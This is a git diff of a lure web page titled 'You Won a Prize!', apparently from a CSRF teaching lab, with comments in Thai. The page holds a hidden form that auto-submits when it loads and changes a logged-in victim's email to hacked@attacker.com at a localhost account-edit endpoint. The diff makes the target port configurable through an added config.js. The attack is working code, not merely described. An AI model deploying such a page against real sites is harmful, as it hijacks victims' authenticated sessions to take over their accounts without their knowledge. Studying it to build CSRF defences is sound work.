@@ -4,6 +4,7 @@
 <head>
   <meta charset="UTF-8">
   <title>You Won a Prize! 🎉</title>
+  <script src="config.js"></script>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -62,17 +63,21 @@
   <!--
     CSRF ATTACK:
     Form นี้ submit อัตโนมัติทันทีที่หน้าโหลด
-    ถ้า victim (alice) login อยู่ที่ localhost:5000
+    ถ้า victim (alice) login อยู่
     browser จะส่ง session cookie ไปด้วยอัตโนมัติ
     → email ของ alice จะถูกเปลี่ยนเป็น hacked@attacker.com
   -->
-  <form id="csrf-form" method="POST" action="http://localhost:5000/account/edit" style="display:none;">
+  <form id="csrf-form" method="POST" action="" style="display:none;">
     <input type="hidden" name="email" value="hacked@attacker.com">
   </form>
 
   <script>
     // Auto-submit เมื่อโหลดหน้า — victim ไม่รู้ตัว
-    document.getElementById('csrf-form').submit();
+    var form = document.getElementById('csrf-form');
+    // ใช้ TARGET_PORT จาก config.js
+    var port = (typeof TARGET_PORT !== 'undefined') ? TARGET_PORT : 5000;
+    form.action = "http://localhost:" + port + "/account/edit";
+    form.submit();
 
     setTimeout(function () {
       document.getElementById('status').textContent = 'Done! Redirecting...';
